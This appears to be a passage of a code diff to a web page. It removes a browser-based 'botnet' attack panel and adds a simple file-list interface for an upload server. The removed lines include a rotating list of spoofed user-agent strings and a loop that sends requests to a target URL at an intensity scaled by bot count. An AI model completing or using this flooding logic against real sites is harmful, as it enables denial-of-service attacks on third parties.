-'Mozilla/5.0 (iPad; CPU OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/43.0.2357.61 Mobile/12F69 Safari/600.1.4',
-'Mozilla/5.0 (Linux; Android 4.4.2; SM-T237P Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36',
-'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.152 Safari/537.36',
-'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; ATT; rv:11.0) like Gecko',
-'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36',
-'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36',
-'Mozilla/5.0 (Linux; Android 5.0.2; SM-T800 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.133 Safari/537.36',
-'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; EIE10;ENUSMSN; rv:11.0) like Gecko',
-'Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; MATBJS; rv:11.0) like Gecko',
-'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.107 Safari/537.36',
-'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36',
-   
-];
-            function sendRequest() {
-                if (Date.now() >= endTime) {
-                    return;
-                }
+      if (files.length === 0) {
+        fileList.innerHTML = '<li class="empty-message">Server is empty. Upload some files!</li>';
+      } else {
+        files.forEach((file, index) => {
+          const listItem = document.createElement('li');
+          listItem.id = `file-${index}`;
 
-                const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
-                simulateRequest(targetUrl, attackType, userAgent);
+          const fileName = document.createElement('span');
+          fileName.textContent = file.name;
 
-                setTimeout(sendRequest, 500 / (numBots * 500)); // Adjust intensity based on bot count
-            }
+          const checkbox = document.createElement('input');
+          checkbox.type = 'checkbox';
 
-            for (let i = 0; i < numBots; i++) {
-                setTimeout(sendRequest, i * 500);
-            }
-        }
-
-        // Function to stop the attack
-        function stopAttack() {
-            botStatus = "Online";
-            attackStatus = "Idle";
-            updateBotnetStatus();
-            alert('Attack stopped.');
-            clearInterval(attackInterval);
-        }
-
-        // Simulate botnet initialization
-        function initializeBotnet() {
-            bots = [];
-            for (let i = 0; i < botCount; i++) {
-                bots.push(`Bot ${i + 1}`);
-            }
-            botStatus = "Online";
-            updateBotnetStatus();
-        }
-
-        // Initialize the botnet when the page loads
-        window.onload = initializeBotnet;
-    </script>
+          listItem.appendChild(checkbox);
+          listItem.appendChild(fileName);
+          fileList.appendChild(listItem);
+        });
+      }
+    }
+  </script>
 </body>
 </html>
